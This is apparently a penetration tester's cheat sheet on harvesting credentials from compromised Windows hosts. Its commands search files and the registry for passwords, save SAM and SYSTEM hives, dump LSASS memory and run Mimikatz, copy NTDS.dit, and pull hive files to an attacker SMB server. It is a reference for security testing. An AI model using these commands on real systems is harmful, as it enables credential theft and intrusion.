---
tags: [basics, technique, windows, password]
---


> [!info] See also: [[Techniques/Password Cracking/Password Attacks]] · [[Active Directory]]

## Filesystem Search

Use a proper search term list to find credentials. Common keywords:

- Passwords / Password / Passphrase
- Username / User account
- pwd / passkey
- Login / Keys / Creds
- dbcredential / dbpassword
- Credentials

```cmd
# Search all text-like files for "password" keyword
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Search for common credential file names
dir /s /b *pass* *cred* *secret* *vnc* *.config 2>NUL

# Search registry for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

```powershell
# Recursive search for password strings
Select-String -Path C:\Users\* -Pattern "password" -Include *.txt,*.xml,*.ini,*.config -Recurse

# Search for files with "pass" in the name
Get-ChildItem -Recurse -Path C:\Users -Include *pass*,*cred* -File -ErrorAction SilentlyContinue
```

## Common High-Value Locations

```
C:\Unattend.xml                         # Windows setup answer file
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\system32\sysprep\sysprep.xml
C:\inetpub\wwwroot\web.config           # IIS application config
%APPDATA%\filezilla\sitemanager.xml     # FTP client saved credentials
%APPDATA%\FileZilla\recentservers.xml
C:\ProgramData\McAfee\Common Framework\SiteList.xml  # McAfee ePO
```

Other typical places to find passwords:
- Group Policy in the SYSVOL share
- Login scripts
- AD user/computer description fields
- KeePass databases — pull `.kdbx`, crack with `keepass2john`, and use the master password to unlock many credentials


## SAM / Registry Hive Dump

Registry hives for offline password cracking:
- `HKLM\SAM` — local user account hashes
- `HKLM\SYSTEM` — boot key needed to decrypt SAM
- `HKLM\SECURITY` — LSA secrets, cached domain logon (DCC2), DPAPI

```cmd
# Save registry hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Parse offline with impacket secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

To transfer the hive files back, you can spin up an SMB server on the attacker box:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```


## LSASS / In-Memory Credentials

```cmd
# Find lsass.exe process (cmd)
tasklist /svc

# Find lsass.exe process (PowerShell)
Get-Process lsass

# Memory Dump using rundll32 -> will trigger most AVs
rundll32 C:\Windows\system32\comsvcs.dll, MiniDump <process-id> C:\lsass.dmp full

# Or via procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Parse the dump offline with [pypykatz](https://github.com/skelsec/pypykatz) (Mimikatz in pure Python):

```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

Or with classic Mimikatz directly on the host (requires SYSTEM or `SeDebugPrivilege`):

```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Or against a captured dump
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```


## NTDS (Domain Controller)

Once on a DC, copy the NTDS.dit file. Use `crackmapexec`'s `--ntds` for the fast path, or do it manually:

```cmd
# Check local group memberships & user permissions
net localgroup
net user <username>

# Create a Volume Shadow Copy (VSS) and copy NTDS.dit out of it
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```


## Credential Manager

```cmd
cmdkey /list                            # list stored credentials
# Use with runas to log in as that user:
runas /savecred /user:DOMAIN\user cmd.exe
```


## Automated Tools

```cmd
# LaZagne — credentials recovery from browsers, apps, system
start lazagne.exe all

# WinPEAS / Seatbelt also surface stored credentials during enum
.\lazagne.exe all                       
.\SharpDPAPI.exe credentials            # DPAPI credential decryption
```
